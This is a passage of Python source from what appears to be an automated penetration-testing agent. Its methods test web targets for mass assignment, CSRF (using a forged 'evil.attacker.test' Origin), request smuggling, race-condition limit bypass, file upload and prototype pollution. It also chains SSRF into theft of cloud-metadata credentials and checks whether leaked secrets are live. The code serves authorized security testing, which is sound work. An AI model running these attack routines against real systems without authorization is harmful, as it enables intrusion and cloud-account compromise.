                logger.error("jwt_scan_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info(
            "jwt_scan_done",
            verify_url=verify_url,
            confirmed=len(confirmed),
            techniques=[f.technique for f in confirmed],
        )
        return {
            "status": "success",
            "tool": "jwt_tester",
            "target": verify_url,
            "confirmed": len(confirmed) > 0,
            "findings_count": len(minted),
            "techniques": [f.technique for f in confirmed],
            "findings": [v.model_dump() for v in minted],
        }

    async def _execute_mass_assignment_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm mass assignment: inject privileged fields the user shouldn't be
        able to set (role, isAdmin, id, ...) into a create/update request, then check
        whether the server PERSISTED them (echoed back in the created object or a
        read-back). A persisted privileged value is a confirmed mass-assignment.

        Payload:
            url            create/update endpoint (e.g. /api/Users)
            method         POST (default) | PUT | PATCH
            base_body      dict of legitimate fields for a valid request
            inject         dict of privileged fields to attempt (default role=admin,
                           isAdmin=true, isDeluxe=true)
            readback_url   optional GET to confirm persistence (else use the response)
            engagement_id  injected by _execute
        """
        url = payload.get("url") or payload.get("target_url") or payload.get("target")
        if not url:
            raise AgentException("mass_assignment_scan requires 'url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("mass_assignment_scan: cannot determine engagement_id")

        method = payload.get("method", "POST").upper()
        base_body = dict(payload.get("base_body") or {})
        inject = dict(payload.get("inject") or {"role": "admin", "isAdmin": True, "isDeluxe": True})
        token = payload.get("token")
        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"
            headers["Cookie"] = f"token={token}"

        def _reflects(text: str, k: str, v: Any) -> bool:
            """True when field ``k``=``v`` appears in the response/read-back body."""
            try:
                flat = json.dumps(json.loads(text))
            except Exception:
                flat = text or ""
            needle = json.dumps({k: v})[1:-1]  # e.g. "role": "admin"
            return (
                needle in flat
                or f'"{k}":{json.dumps(v)}' in flat
                or f'"{k}": {json.dumps(v)}' in flat
            )

        readback_url = payload.get("readback_url")
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=20) as c:
                # 1. CONTROL — a legitimate request WITHOUT the injected privileged
                #    fields. Anything already present here is a server default / echo-all,
                #    NOT attacker-controlled, so it must be suppressed from the result.
                control_resp = await c.request(method, url, json=base_body, headers=headers)
                control_text = control_resp.text
                if readback_url:
                    control_text = (await c.get(readback_url, headers=headers)).text

                # 2. INJECTED — the same request WITH the privileged fields added.
                inj_resp = await c.request(
                    method, url, json={**base_body, **inject}, headers=headers
                )
                inj_text = inj_resp.text
                independent_readback = False
                if readback_url:
                    inj_text = (await c.get(readback_url, headers=headers)).text
                    independent_readback = True
        except Exception as e:
            logger.warning("mass_assignment_failed", url=url, error=str(e))
            return {"status": "error", "tool": "mass_assignment_scan", "error": str(e)}

        # 3. Baseline suppression: a field is attacker-controlled ONLY if the injected
        #    value appears after injection but was ABSENT in the control. This kills the
        #    two dominant false positives — servers that echo the whole request body, and
        #    fields the server sets by default regardless of input.
        accepted_fields: Dict[str, Any] = {}
        for k, v in inject.items():
            if _reflects(inj_text, k, v) and not _reflects(control_text, k, v):
                accepted_fields[k] = v

        if not accepted_fields:
            logger.info("mass_assignment_clean", url=url)
            return {
                "status": "success",
                "tool": "mass_assignment_scan",
                "target": url,
                "confirmed": False,
                "findings_count": 0,
            }

        # 4. Proof strength (diff-auth contract): an INDEPENDENT read-back proves the
        #    value was persisted (report-ready). A create-response echo only shows the
        #    server accepted the field into its response — a strong lead, but a triager
        #    can dispute "reflected != persisted", so it is flagged for manual confirm,
        #    demoted to MEDIUM, and NOT marked validated.
        if independent_readback:
            provenance = "persisted"
            validated = True
            confidence = 0.9
            severity = Severity.HIGH
            manual_confirm_required = False
            proof = "persisted (confirmed via independent read-back)"
        else:
            provenance = "reflected"
            validated = False
            confidence = 0.5
            severity = Severity.MEDIUM
            manual_confirm_required = True
            proof = "reflected in the create response only — provide readback_url to confirm persistence"

        vuln = Vulnerability(
            cwe="CWE-915",  # Improperly Controlled Modification of Object Attributes
            vuln_type=VulnClass.MASS_ASSIGNMENT,
            severity=severity,
            title=f"Mass assignment via {', '.join(accepted_fields)}",
            description=(
                f"The endpoint {url} accepted attacker-supplied privileged field(s) "
                f"{accepted_fields} that a normal user should not control, and a control "
                f"request without those fields did not exhibit them ({proof}). This "
                f"enables privilege escalation."
            ),
            evidence=[
                {
                    "type": "mass_assignment",
                    "provenance": provenance,
                    "url": url,
                    "method": method,
                    "accepted_fields": accepted_fields,
                    "injected": inject,
                    "baseline_suppressed": True,  # confirmed absent in the control request
                    "independent_readback": independent_readback,
                    "manual_confirm_required": manual_confirm_required,
                }
            ],
            tool_source="mass_assignment_scan",
            confidence=confidence,
            validated=validated,
            exploitability="high",
            impact="high",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("mass_assignment_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info(
            "mass_assignment_confirmed",
            url=url,
            fields=list(accepted_fields),
            provenance=provenance,
            manual_confirm_required=manual_confirm_required,
        )
        return {
            "status": "success",
            "tool": "mass_assignment_scan",
            "target": url,
            "confirmed": True,
            "provenance": provenance,
            "manual_confirm_required": manual_confirm_required,
            "accepted_fields": accepted_fields,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    async def _execute_csrf_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Detect CSRF on a state-changing endpoint. CSRF requires AMBIENT auth
        (cookies the browser attaches cross-site) AND no anti-CSRF token. We:
          1. confirm the action works with the credential,
          2. replay it with a foreign Origin/Referer and NO CSRF token,
          3. flag CSRF only if it still succeeds AND auth is cookie-based.
        Bearer-token APIs (token in Authorization header) are NOT CSRF-able — the
        token isn't sent cross-site — and we honestly report that.

        Payload:
            url, method(POST default), body, cookie (ambient cred) | token (bearer),
            success_status (default 200/201), engagement_id
        """
        url = payload.get("url") or payload.get("target")
        if not url:
            raise AgentException("csrf_scan requires 'url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("csrf_scan: cannot determine engagement_id")

        method = payload.get("method", "POST").upper()
        body = payload.get("body")
        cookie = payload.get("cookie")  # ambient credential => CSRF-relevant
        token = payload.get("token")  # bearer => NOT CSRF-able
        ok_statuses = set(payload.get("success_status", [200, 201, 204]))

        if not cookie:
            # No ambient credential: bearer/header auth can't be driven cross-site.
            logger.info("csrf_not_applicable_bearer", url=url)
            return {
                "status": "success",
                "tool": "csrf_scan",
                "target": url,
                "confirmed": False,
                "reason": "auth is not cookie/ambient (bearer tokens are not sent cross-site); CSRF not exploitable",
                "findings_count": 0,
            }

        # Cross-site forgery simulation: foreign Origin, ambient cookie, no CSRF token.
        headers = {
            "Origin": "https://evil.attacker.test",
            "Referer": "https://evil.attacker.test/csrf.html",
            "Cookie": cookie,
            "Content-Type": payload.get("content_type", "application/json"),
        }
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=20) as c:
                if isinstance(body, (dict, list)):
                    resp = await c.request(method, url, json=body, headers=headers)
                else:
                    resp = await c.request(method, url, content=body or b"", headers=headers)
        except Exception as e:
            logger.warning("csrf_probe_failed", url=url, error=str(e))
            return {"status": "error", "tool": "csrf_scan", "error": str(e)}

        accepted = resp.status_code in ok_statuses
        if not accepted:
            return {
                "status": "success",
                "tool": "csrf_scan",
                "target": url,
                "confirmed": False,
                "reason": f"cross-site request rejected (status {resp.status_code})",
                "findings_count": 0,
            }

        vuln = Vulnerability(
            cwe="CWE-352",
            vuln_type=VulnClass.CSRF,
            severity=Severity.MEDIUM,
            title="Cross-Site Request Forgery on state-changing endpoint",
            description=(
                f"{method} {url} accepted a cross-site request (foreign Origin, ambient "
                f"cookie, no anti-CSRF token) with status {resp.status_code}, indicating "
                f"the state-changing action can be forged from an attacker page."
            ),
            evidence=[
                {
                    "type": "csrf",
                    "provenance": "http",
                    "url": url,
                    "method": method,
                    "status": resp.status_code,
                    "origin": headers["Origin"],
                }
            ],
            tool_source="csrf_scan",
            confidence=0.85,
            validated=True,
            exploitability="medium",
            impact="medium",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("csrf_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info("csrf_confirmed", url=url, status=resp.status_code)
        return {
            "status": "success",
            "tool": "csrf_scan",
            "target": url,
            "confirmed": True,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    async def _execute_request_smuggling_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Detect HTTP request smuggling (CL.TE / TE.CL desync) with SAFE timing
        probes — no request is smuggled into another user's connection. A desync is
        flagged when a crafted probe makes the back-end hang awaiting chunk data,
        delaying the response far beyond a fast baseline.

        Payload:
            url            target URL
            techniques     list subset of ["cl.te","te.cl"] (default both)
            threshold_ms   delay over baseline that indicates desync (default 4000)
            recv_timeout   seconds to wait for the probe response (default 8)
            engagement_id  injected by _execute
        """
        from ai_osop.core.smuggle_probe import probe_desync

        url = payload.get("url") or payload.get("target")
        if not url:
            raise AgentException("request_smuggling_scan requires 'url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("request_smuggling_scan: cannot determine engagement_id")

        parsed = urlparse(url)
        use_tls = parsed.scheme == "https"
        host = parsed.hostname or "127.0.0.1"
        port = parsed.port or (443 if use_tls else 80)
        path = parsed.path or "/"
        techniques = payload.get("techniques") or ["cl.te", "te.cl"]
        threshold_ms = float(payload.get("threshold_ms", 4000))
        recv_timeout = float(payload.get("recv_timeout", 8))

        confirmed = None
        probes = []
        for tech in techniques:
            res = await asyncio.to_thread(
                probe_desync,
                host,
                port,
                path=path,
                technique=tech,
                use_tls=use_tls,
                recv_timeout=recv_timeout,
                threshold_ms=threshold_ms,
            )
            probes.append(res)
            if res.get("vulnerable"):
                confirmed = res
                break

        if not confirmed:
            logger.info("request_smuggling_clean", url=url, probes=probes)
            return {
                "status": "success",
                "tool": "request_smuggling_scan",
                "target": url,
                "confirmed": False,
                "probes": probes,
                "findings_count": 0,
            }

        # A single elevated desync timing is notoriously noisy (network jitter, GC pause,
        # cold cache). Require the winning technique to REPRODUCE before claiming validated
        # proof — otherwise it is a manual-confirm lead, not a report-ready finding.
        tech = confirmed["technique"]
        reproductions = 1  # the initial hit
        for _ in range(2):
            r = await asyncio.to_thread(
                probe_desync,
                host,
                port,
                path=path,
                technique=tech,
                use_tls=use_tls,
                recv_timeout=recv_timeout,
                threshold_ms=threshold_ms,
            )
            probes.append(r)
            if r.get("vulnerable"):
                reproductions += 1
        reproduced = reproductions >= 2  # >= 2 of 3 elevated timings

        if reproduced:
            severity, confidence, validated, manual_confirm = Severity.HIGH, 0.85, True, False
        else:
            severity, confidence, validated, manual_confirm = Severity.MEDIUM, 0.5, False, True

        vuln = Vulnerability(
            cwe="CWE-444",  # HTTP Request/Response Smuggling
            vuln_type=VulnClass.REQUEST_SMUGGLING,
            severity=severity,
            title=f"HTTP request smuggling ({confirmed['technique'].upper()}) at {host}"
            + ("" if reproduced else " — timing lead, unconfirmed"),
            description=(
                f"A {confirmed['technique'].upper()} desync timing probe against {url} delayed "
                f"the response to {confirmed['probe_ms']}ms vs a {confirmed['baseline_ms']}ms "
                f"baseline, indicating the front-end and back-end may disagree on message length. "
                f"Reproduced {reproductions}/3 times. "
                + (
                    "This enables request smuggling (cache poisoning, auth bypass, request hijack)."
                    if reproduced
                    else "The timing did not reproduce consistently — confirm manually with a "
                    "differential (smuggled-prefix) response before submitting."
                )
            ),
            evidence=[
                {
                    "type": "request_smuggling",
                    "provenance": "timing_probe",
                    "url": url,
                    "reproductions": reproductions,
                    "manual_confirm_required": manual_confirm,
                    **confirmed,
                }
            ],
            tool_source="request_smuggling_scan",
            confidence=confidence,
            validated=validated,
            exploitability="high",
            impact="high",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("request_smuggling_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info("request_smuggling_confirmed", url=url, technique=confirmed["technique"])
        return {
            "status": "success",
            "tool": "request_smuggling_scan",
            "target": url,
            "confirmed": True,
            "technique": confirmed["technique"],
            "manual_confirm_required": manual_confirm,
            "reproductions": reproductions,
            "probes": probes,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    async def _ssrf_fetch_via_sink(self, metadata_url: str) -> str:
        """Drive an in-band SSRF: place metadata_url into the configured sink and
        return the fetched body the target echoes back. Populated by
        _execute_ssrf_metadata_chain via closure-bound config."""
        cfg = getattr(self, "_ssrf_chain_cfg", {})
        url = cfg["url"]
        param = cfg.get("param")
        body_field = cfg.get("body_field")
        body_format = cfg.get("body_format", "json")
        method = cfg.get("method", "POST" if body_field else "GET")
        base_body = cfg.get("base_body", {})
        headers = cfg.get("headers", {})
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
                if body_field:
                    body = {**base_body, body_field: metadata_url}
                    if body_format == "form":
                        resp = await c.request(method, url, data=body, headers=headers)
                    else:
                        resp = await c.request(method, url, json=body, headers=headers)
                else:
                    inj = self._inject_payload(url, metadata_url, param)
                    resp = await c.request(method, inj, headers=headers)
                return resp.text
        except Exception as e:
            logger.warning("ssrf_metadata_fetch_failed", url=metadata_url, error=str(e))
            return ""

    async def _execute_ssrf_metadata_chain(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Chain an IN-BAND SSRF into cloud-metadata credential theft. Drives the
        SSRF at IMDS/GCP/Azure metadata endpoints (2-step AWS role expansion),
        extracts credentials from the echoed body, and mints a CRITICAL finding —
        SSRF -> live cloud credentials is a top-impact chain. Secrets are REDACTED.

        Payload:
            url            in-band SSRF endpoint (echoes the fetched body)
            param          query param the fetch-URL goes into, OR
            body_field     body field the fetch-URL goes into (+ body_format json|form)
            base_body, method, token/cookie
            engagement_id  injected by _execute
        """
        from ai_osop.core.cloud_metadata import IMDS_TARGETS, extract_credentials

        url = payload.get("url") or payload.get("target")
        if not url:
            raise AgentException("ssrf_metadata_chain requires 'url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("ssrf_metadata_chain: cannot determine engagement_id")

        headers: Dict[str, str] = dict(payload.get("headers") or {})
        if payload.get("token"):
            headers.setdefault("Authorization", f"Bearer {payload['token']}")
            headers.setdefault("Cookie", f"token={payload['token']}")
        if payload.get("cookie"):
            headers["Cookie"] = payload["cookie"]
        self._ssrf_chain_cfg = {
            "url": url,
            "param": payload.get("param"),
            "body_field": payload.get("body_field"),
            "body_format": payload.get("body_format", "json"),
            "method": payload.get("method", "POST" if payload.get("body_field") else "GET"),
            "base_body": dict(payload.get("base_body") or {}),
            "headers": headers,
        }

        targets = payload.get("metadata_targets") or IMDS_TARGETS
        found = []
        proof_url = ""
        for base in targets:
            body = await self._ssrf_fetch_via_sink(base)
            creds = extract_credentials(body)
            if creds:
                found, proof_url = creds, base
                break
            # AWS 2-step: the role-list path returns a bare role name; fetch its creds.
            if base.endswith("security-credentials/") and body.strip() and "{" not in body:
                role = body.strip().splitlines()[0].strip()
                if role:
                    body2 = await self._ssrf_fetch_via_sink(base + role)
                    creds = extract_credentials(body2)
                    if creds:
                        found, proof_url = creds, base + role
                        break

        if not found:
            logger.info("ssrf_metadata_chain_clean", url=url)
            return {
                "status": "success",
                "tool": "ssrf_metadata_chain",
                "target": url,
                "confirmed": False,
                "findings_count": 0,
            }

        provider = found[0]["provider"]
        vuln = Vulnerability(
            cwe="CWE-918",
            vuln_type=VulnClass.SSRF,
            severity=Severity.CRITICAL,
            title=f"SSRF to {provider.upper()} metadata - live cloud credentials stolen",
            description=(
                f"The in-band SSRF at {url} was chained to the {provider} metadata service "
                f"({proof_url}) and returned live cloud credentials, enabling full account "
                f"compromise. This is a critical SSRF -> credential-theft chain."
            ),
            evidence=[
                {
                    "type": "ssrf_metadata_chain",
                    "provenance": "ssrf+metadata",
                    "ssrf_url": url,
                    "metadata_url": proof_url,
                    "credentials": found,  # already redacted by extract_credentials
                }
            ],
            tool_source="ssrf_metadata_chain",
            confidence=0.98,
            validated=True,
            exploitability="high",
            impact="high",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("ssrf_metadata_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info(
            "ssrf_metadata_chain_confirmed", url=url, provider=provider, metadata_url=proof_url
        )
        return {
            "status": "success",
            "tool": "ssrf_metadata_chain",
            "target": url,
            "confirmed": True,
            "provider": provider,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    async def _execute_race_limit_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm a race-condition / limit bypass (TOCTOU, double-spend, coupon
        reuse) by firing N last-byte-synchronized single-packet requests at a
        once-only action and counting how many SUCCEEDED. More successes than the
        action permits => the check-then-act window was exploited => validated
        finding. Builds on the real raw-socket turbo-intruder engine.

        Payload:
            url            the state-changing action (e.g. /redeem, /apply-coupon)
            method         POST (default), headers, body
            token/cookie   auth credential
            concurrent_requests  N synchronized requests (default 20)
            success_status       HTTP status meaning the action succeeded (default 200)
            expected_max_successes  how many should legitimately succeed (default 1)
            engagement_id  injected by _execute
        """
        url = payload.get("url") or payload.get("target")
        if not url:
            raise AgentException("race_limit_scan requires 'url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("race_limit_scan: cannot determine engagement_id")

        n = int(payload.get("concurrent_requests", 20))
        success_status = int(payload.get("success_status", 200))
        expected_max = int(payload.get("expected_max_successes", 1))
        headers = dict(payload.get("headers") or {})
        auth_token = payload.get("token")
        cookie = payload.get("cookie")
        if auth_token:
            headers.setdefault("Authorization", f"Bearer {auth_token}")
            headers.setdefault("Cookie", f"token={auth_token}")
        if cookie:
            headers["Cookie"] = cookie

        session = await self.ctx.session_memory.get_session_state(engagement_id)
        if session:
            try:
                await self.turbo.initialize(session.scope, session.session_id)
            except Exception:
                pass

        try:
            result = await self.turbo.execute_single_packet_attack(
                target_url=url,
                method=payload.get("method", "POST"),
                headers=headers,
                body=payload.get("body", ""),
                concurrent_requests=n,
            )
        except Exception as e:
            logger.warning("race_limit_failed", url=url, error=str(e))
            return {"status": "error", "tool": "race_limit_scan", "error": str(e)}

        dist = result.get("status_distribution", {}) or {}
        success_count = int(dist.get(str(success_status), 0))

        if success_count <= expected_max:
            logger.info("race_limit_clean", url=url, success_count=success_count)
            return {
                "status": "success",
                "tool": "race_limit_scan",
                "target": url,
                "confirmed": False,
                "success_count": success_count,
                "status_distribution": dist,
                "findings_count": 0,
            }

        vuln = Vulnerability(
            cwe="CWE-362",  # Concurrent Execution using Shared Resource (Race Condition)
            vuln_type=VulnClass.RACE_CONDITION,
            severity=Severity.HIGH,
            title=f"Race condition / limit bypass at {url}",
            description=(
                f"A once-only action at {url} succeeded {success_count} times when only "
                f"{expected_max} should be permitted, under {n} last-byte-synchronized "
                f"single-packet requests (release window {result.get('release_window_ms')}ms). "
                f"The time-of-check/time-of-use window enables double-spend / limit bypass."
            ),
            evidence=[
                {
                    "type": "race_condition",
                    "provenance": "turbo_single_packet",
                    "url": url,
                    "success_count": success_count,
                    "expected_max": expected_max,
                    "concurrency": n,
                    "status_distribution": dist,
                    "release_window_ms": result.get("release_window_ms"),
                }
            ],
            tool_source="race_limit_scan",
            confidence=0.96,
            validated=True,
            exploitability="high",
            impact="high",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("race_limit_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info(
            "race_limit_confirmed", url=url, success_count=success_count, expected_max=expected_max
        )
        return {
            "status": "success",
            "tool": "race_limit_scan",
            "target": url,
            "confirmed": True,
            "success_count": success_count,
            "status_distribution": dist,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    @staticmethod
    def _redact_secret(value: str) -> str:
        """Mask a credential so it is never persisted in the graph in full."""
        if not value:
            return ""
        if len(value) <= 8:
            return value[:2] + "***"
        return f"{value[:4]}...{value[-2:]} (len {len(value)})"

    async def _verify_one_secret(self, secret: str, base_override=None) -> Dict[str, Any]:
        """Verify a single secret's liveness via the read-only provider verifier."""
        from ai_osop.core.secret_verifier import verify_secret

        return await verify_secret(secret, base_override=base_override)

    async def _execute_secret_liveness_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Turn found secrets into CONFIRMED live credentials via a benign, read-only
        provider identity check. Mints a finding only when a secret actually
        authenticates — an unverified "exposed key" is informational and gets
        rejected by triagers. The raw secret is REDACTED before persistence.

        Payload:
            secrets        list of secret strings (or dicts with a 'value' key)
            base_override  optional provider base URL (point checks at a mock)
            engagement_id  injected by _execute
        """
        raw = payload.get("secrets") or []
        secrets: List[str] = []
        for s in raw:
            if isinstance(s, dict):
                v = s.get("value") or s.get("secret") or ""
            else:
                v = str(s)
            if v:
                secrets.append(v)
        if not secrets:
            raise AgentException("secret_liveness_scan requires 'secrets' (non-empty list)")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("secret_liveness_scan: cannot determine engagement_id")
        base_override = payload.get("base_override")

        minted = []
        for secret in secrets:
            try:
                verdict = await self._verify_one_secret(secret, base_override=base_override)
            except Exception as e:
                logger.warning("secret_verify_failed", error=str(e))
                continue
            if not verdict.get("live"):
                continue
            provider = verdict.get("provider") or "unknown"
            vuln = Vulnerability(
                cwe="CWE-798",  # Use of Hard-coded / exposed Credentials
                vuln_type=VulnClass.EXPOSED_SECRET,
                severity=Severity.CRITICAL,
                title=f"Live {provider} credential exposed",
                description=(
                    f"An exposed {provider} secret was confirmed LIVE via a read-only "
                    f"identity check (HTTP {verdict.get('status')}). The credential "
                    f"authenticates and grants access — not a theoretical leak."
                ),
                evidence=[
                    {
                        "type": "live_credential",
                        "provenance": "secret_verifier",
                        "provider": provider,
                        "secret_redacted": self._redact_secret(secret),
                        "verify_status": verdict.get("status"),
                        "check": "read-only identity endpoint",
                    }
                ],
                tool_source="secret_liveness_scan",
                confidence=0.98,
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await self.ctx.graph_memory.add_vulnerability(vuln)
                self.findings[vuln.id] = vuln
                minted.append(vuln)
            except Exception as e:
                logger.error("secret_liveness_persist_failed", vuln_id=vuln.id, error=str(e))
            logger.info("secret_liveness_confirmed", provider=provider)

        return {
            "status": "success",
            "tool": "secret_liveness_scan",
            "secrets_checked": len(secrets),
            "confirmed": len(minted) > 0,
            "findings_count": len(minted),
            "findings": [v.model_dump() for v in minted],
        }

    async def _execute_file_upload_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm unrestricted file upload with the standalone FileUploadTester.

        The tester uploads benign marker files (html/svg/php/double-ext/...) and
        confirms only when the file is retrievable and served in a dangerous way
        (executable extension / matching content-type). Mints ONE Vulnerability per
        result with confirmed == True — unconfirmed attempts mint nothing.

        Payload:
            upload_url     endpoint accepting the multipart upload (required)
            retrieval_base optional base URL where uploaded files are served
            file_field     multipart field name for the file (default "file")
            extra_data     extra multipart form fields the endpoint requires
            engagement_id  injected by _execute
        """
        from ai_osop.core.file_upload_tester import FileUploadTester

        upload_url = payload.get("upload_url")
        if not upload_url:
            raise AgentException("file_upload_scan requires 'upload_url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("file_upload_scan: cannot determine engagement_id")

        tester = FileUploadTester(
            upload_url,
            retrieval_base=payload.get("retrieval_base"),
            file_field=payload.get("file_field", "file"),
            extra_data=payload.get("extra_data"),
        )
        results = await tester.run()

        minted: List[Vulnerability] = []
        for r in results:
            if not getattr(r, "confirmed", False):
                continue
            vuln = Vulnerability(
                cwe="CWE-434",  # Unrestricted Upload of File with Dangerous Type
                vuln_type=VulnClass.VULN_SCAN,
                severity=Severity.HIGH,
                title=f"Unrestricted file upload confirmed ({r.technique})",
                description=(
                    f"FileUploadTester uploaded a benign marker file to {upload_url} and "
                    f"retrieved it served in a way that confirms unrestricted upload: "
                    f"{getattr(r, 'detail', '')}"
                ),
                evidence=[
                    {
                        "type": "unrestricted_file_upload",
                        "provenance": "file_upload_tester",
                        "technique": r.technique,
                        "detail": getattr(r, "detail", ""),
                        "filename": getattr(r, "filename", ""),
                        "retrieval_url": getattr(r, "retrieval_url", ""),
                        "served_content_type": getattr(r, "served_content_type", ""),
                        "marker": getattr(r, "marker", ""),
                        "tester_evidence": getattr(r, "evidence", {}),
                    }
                ],
                tool_source="file_upload_scan",
                confidence=0.95,
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await self.ctx.graph_memory.add_vulnerability(vuln)
                self.findings[vuln.id] = vuln
                minted.append(vuln)
            except Exception as e:
                logger.error("file_upload_persist_failed", vuln_id=vuln.id, error=str(e))
            logger.info("file_upload_confirmed", technique=r.technique)

        return {
            "status": "success",
            "tool": "file_upload_scan",
            "results_checked": len(results),
            "confirmed": len(minted) > 0,
            "findings_count": len(minted),
            "findings": [v.model_dump() for v in minted],
        }

    async def _execute_prototype_pollution_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm server-side prototype pollution with PrototypePollutionTester.

        The tester injects a unique inherited property (via __proto__ /
        constructor.prototype gadgets) then observes a payload-free probe for the
        polluted value / an overridden status. Mints ONE Vulnerability per result
        with confirmed == True.

        Payload:
            pollute_url    endpoint that ingests/merges attacker JSON (required)
            probe_url      endpoint observed after pollution (default pollute_url)
            pollute_method HTTP method for the pollution payload (default POST)
            probe_method   HTTP method for the payload-free probe (default GET)
            engagement_id  injected by _execute
        """
        from ai_osop.core.prototype_pollution_tester import PrototypePollutionTester

        pollute_url = payload.get("pollute_url")
        if not pollute_url:
            raise AgentException("prototype_pollution_scan requires 'pollute_url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("prototype_pollution_scan: cannot determine engagement_id")

        tester = PrototypePollutionTester(
            pollute_url,
            probe_url=payload.get("probe_url"),
            pollute_method=payload.get("pollute_method", "POST"),
            probe_method=payload.get("probe_method", "GET"),
        )
        results = await tester.run()

        minted: List[Vulnerability] = []
        for r in results:
            if not getattr(r, "confirmed", False):
                continue
            vuln = Vulnerability(
                cwe="CWE-1321",  # Improperly Controlled Modification of Object Prototype Attributes
                vuln_type=VulnClass.VULN_SCAN,
                severity=Severity.HIGH,
                title=f"Server-side prototype pollution confirmed ({r.technique})",
                description=(
                    f"PrototypePollutionTester polluted the object prototype at {pollute_url} "
                    f"(gadget {getattr(r, 'gadget', '')}) and observed the effect in a "
                    f"payload-free probe: {getattr(r, 'detail', '')}"
                ),
                evidence=[
                    {
                        "type": "prototype_pollution",
                        "provenance": "prototype_pollution_tester",
                        "technique": r.technique,
                        "gadget": getattr(r, "gadget", ""),
                        "detail": getattr(r, "detail", ""),
                        "tester_evidence": getattr(r, "evidence", {}),
                    }
                ],
                tool_source="prototype_pollution_scan",
                confidence=0.95,
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await self.ctx.graph_memory.add_vulnerability(vuln)
                self.findings[vuln.id] = vuln
                minted.append(vuln)
            except Exception as e:
                logger.error("prototype_pollution_persist_failed", vuln_id=vuln.id, error=str(e))
            logger.info("prototype_pollution_confirmed", technique=r.technique)

        return {
            "status": "success",
            "tool": "prototype_pollution_scan",
            "results_checked": len(results),
            "confirmed": len(minted) > 0,
            "findings_count": len(minted),
            "findings": [v.model_dump() for v in minted],
        }

    async def _execute_websocket_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm WebSocket flaws (CSWSH / missing-auth / cleartext) with
        WebSocketTester. Each oracle only confirms on objective server behaviour
        (authed data returned to a foreign Origin, a privileged action honoured on
        an unauthenticated socket, a ws:// endpoint). Mints ONE Vulnerability per
        result with confirmed == True.

        Payload:
            url                          ws:// or wss:// endpoint (required)
            origin                       the site's real same-site origin
            cookies                      victim's ambient cookie header value
            auth_markers                 substrings that appear only in authed data
            probe                        message to send to elicit a data frame
            privileged_message           message driving the missing-auth oracle
            privileged_success_markers   success substrings for the missing-auth oracle
            engagement_id                injected by _execute
        """
        from ai_osop.core.websocket_tester import WebSocketTester

        url = payload.get("url")
        if not url:
            raise AgentException("websocket_scan requires 'url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("websocket_scan: cannot determine engagement_id")

        tester = WebSocketTester(
            url,
            origin=payload.get("origin"),
            cookies=payload.get("cookies"),
            auth_markers=payload.get("auth_markers"),
            probe=payload.get("probe"),
            privileged_message=payload.get("privileged_message"),
            privileged_success_markers=payload.get("privileged_success_markers"),
        )
        results = await tester.run()

        # Per-technique CWE / class. CSWSH is a cross-site socket forgery (CWE-1385);
        # missing-auth is an origin/authorization failure (CWE-346); cleartext is
